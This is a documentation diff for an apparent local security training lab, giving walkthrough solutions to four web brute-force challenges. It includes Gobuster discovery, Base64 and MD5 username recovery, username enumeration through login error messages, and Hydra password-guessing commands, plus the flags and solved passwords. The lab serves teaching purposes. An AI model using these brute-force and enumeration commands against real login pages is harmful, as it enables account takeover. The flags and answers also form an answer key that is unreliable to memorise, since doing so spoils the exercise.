@@ -404,3 +404,85 @@ Nothing in Phase 5c sends a message or captures a credential: the webmail items
 are static strings, the helpdesk bot is a pure function of the message text, and
 the fake sign-in only compares against the invented NPC password. `social.py`
 imports no mail/network client (enforced by `tests/test_phase5c.py`).
+
+## Web brute-force basics
+
+The four consoles use `portal/bruteforce.py` and one small template. Start
+without a supplied username or login endpoint. `/robots.txt` points to three
+directories; each directory links to its login. Gobuster with the bundled
+directory list also finds `/management/`, which robots.txt omits. Random paths
+return real 404s so Gobuster's normal precheck works.
+
+### BF-01 · Form fields and Base64 · A07 · `MFANO{f13ld_n4m3s_m4tt3r}`
+
+1. Discover `/archive/` and follow its link to `/archive/login`.
+2. View Source: `username_b64=YS5uamVyaQ==`.
+   `printf '%s' 'YS5uamVyaQ==' | base64 --decode` gives `a.njeri`.
+3. The HTML input is named `Username`; `legacy-login.js` creates a hidden
+   `username` input and disables the uppercase input before submission.
+   DevTools Network confirms the actual POST key. An automated POST using
+   uppercase `Username` fails even with the right account and password.
+4. Guess passwords from the bundled list. `sunshine` produces the flag:
+
+   ```sh
+   hydra -l a.njeri -P web-bruteforce/wordlists/passwords.txt -s 8080 -t 1 -f \
+     127.0.0.1 http-post-form '/archive/login:username=^USER^&password=^PASS^:S=Login successful'
+   ```
+
+Both an unknown username and a wrong password yield the same generic error.
+The username was encoded, not hashed, and is never prefilled in the form.
+
+### BF-02 · Username-first errors · A07 · `MFANO{3rr0rs_l34k_us3rs}`
+
+Discover `/office/login`. Use an intentionally wrong password and enumerate
+`web-bruteforce/wordlists/usernames.txt`. Every unknown account returns
+`incorrect username`; `registrar` returns `incorrect password`.
+
+```sh
+hydra -L web-bruteforce/wordlists/usernames.txt -p deliberately-wrong -s 8080 -t 1 -f \
+  127.0.0.1 http-post-form '/office/login:username=^USER^&password=^PASS^:S=incorrect password'
+hydra -l registrar -P web-bruteforce/wordlists/passwords.txt -s 8080 -t 1 -f \
+  127.0.0.1 http-post-form '/office/login:username=^USER^&password=^PASS^:S=Login successful'
+```
+
+The first command identifies an account, not a working login. The second
+finds `welcome1` and reveals the flag. `incorrect username` does **not** imply
+the password is right: the username-first branch never checked it.
+
+### BF-03 · A shared password checked first · A07 · `MFANO{p4ssw0rd_ch3ck3d_f1rst}`
+
+Discover `/backup/login`. Its source migration note states
+`check_order=password,username; password_scope=shared`. Keep a deliberately
+invalid username constant and guess passwords. `incorrect password` means
+the shared password failed; `incorrect username` means that password passed.
+
+```sh
+hydra -l deliberately-unknown -P web-bruteforce/wordlists/passwords.txt -s 8080 -t 1 -f \
+  127.0.0.1 http-post-form '/backup/login:username=^USER^&password=^PASS^:S=incorrect username'
+hydra -L web-bruteforce/wordlists/usernames.txt -p football -s 8080 -t 1 -f \
+  127.0.0.1 http-post-form '/backup/login:username=^USER^&password=^PASS^:S=Login successful'
+```
+
+`football` is the intermediate password finding; `archivist` completes the
+login. This is deliberately unusual shared-password logic. Error wording
+alone cannot establish that an arbitrary application behaves the same way.
+
+### BF-04 · A username hash behind an unlisted console · A07 · `MFANO{h4sh_th3n_gu3ss}`
+
+Discover `/management/` with Gobuster, then follow `/management/login`.
+View Source leaks `username_md5=6adcd273d5c53c8a84e1eb0eb640d07f`. This is a
+hash, not reversible encoding: compare hashes of candidate usernames offline.
+
+```python
+import hashlib
+from pathlib import Path
+
+digest = "6adcd273d5c53c8a84e1eb0eb640d07f"
+for candidate in Path("web-bruteforce/wordlists/usernames.txt").read_text().splitlines():
+    if hashlib.md5(candidate.encode()).hexdigest() == digest:
+        print(candidate)
+```
+
+The match is `examadmin`. Guess its password with the same Hydra success
+condition against `/management/login`; `dragon` reveals the flag. Browser
+source contains neither a plaintext account nor the password or flag.
